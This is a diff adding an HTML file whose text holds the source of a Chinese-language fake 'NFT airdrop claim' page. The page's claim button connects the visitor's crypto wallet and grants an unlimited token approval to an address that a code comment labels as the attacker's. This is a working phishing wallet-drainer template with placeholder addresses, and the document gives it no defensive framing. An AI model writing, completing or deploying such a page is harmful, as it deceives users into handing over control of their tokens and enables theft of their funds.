@@ -1,0 +1,42 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <meta http-equiv="Content-Style-Type" content="text/css">
+  <title></title>
+  <meta name="Generator" content="Cocoa HTML Writer">
+  <meta name="CocoaVersion" content="2575.5">
+  <style type="text/css">
+    p.p1 {margin: 0.0px 0.0px 0.0px 0.0px; font: 12.0px Helvetica}
+    p.p2 {margin: 0.0px 0.0px 0.0px 0.0px; font: 12.0px Helvetica; min-height: 14.0px}
+  </style>
+</head>
+<body>
+<p class="p1">&lt;!DOCTYPE html&gt;</p>
+<p class="p1">&lt;html&gt;</p>
+<p class="p1">&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;title&gt;空投領取&lt;/title&gt;&lt;/head&gt;</p>
+<p class="p1">&lt;body&gt;</p>
+<p class="p1"><span class="Apple-converted-space">  </span>&lt;h2&gt;點擊領取你的 NFT 空投！&lt;/h2&gt;</p>
+<p class="p1"><span class="Apple-converted-space">  </span>&lt;button onclick="approve()"&gt;領取獎勵&lt;/button&gt;</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">  </span>&lt;script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.min.js"&gt;&lt;/script&gt;</p>
+<p class="p1"><span class="Apple-converted-space">  </span>&lt;script&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>const tokenAddress = "合約地址A";</p>
+<p class="p1"><span class="Apple-converted-space">    </span>const spender = "你的帳號1地址"; // 攻擊者</p>
+<p class="p1"><span class="Apple-converted-space">    </span>const abi = [</p>
+<p class="p1"><span class="Apple-converted-space">      </span>"function approve(address spender, uint256 amount) public returns (bool)"</p>
+<p class="p1"><span class="Apple-converted-space">    </span>];</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">    </span>async function approve() {</p>
+<p class="p1"><span class="Apple-converted-space">      </span>const provider = new ethers.providers.Web3Provider(window.ethereum);</p>
+<p class="p1"><span class="Apple-converted-space">      </span>await provider.send("eth_requestAccounts", []);</p>
+<p class="p1"><span class="Apple-converted-space">      </span>const signer = provider.getSigner();</p>
+<p class="p1"><span class="Apple-converted-space">      </span>const contract = new ethers.Contract(tokenAddress, abi, signer);</p>
+<p class="p1"><span class="Apple-converted-space">      </span>await contract.approve(spender, ethers.constants.MaxUint256);</p>
+<p class="p1"><span class="Apple-converted-space">      </span>alert("授權成功！");</p>
+<p class="p1"><span class="Apple-converted-space">    </span>}</p>
+<p class="p1"><span class="Apple-converted-space">  </span>&lt;/script&gt;</p>
+<p class="p1">&lt;/body&gt;</p>
+<p class="p1">&lt;/html&gt;</p>
+</body>
+</html>
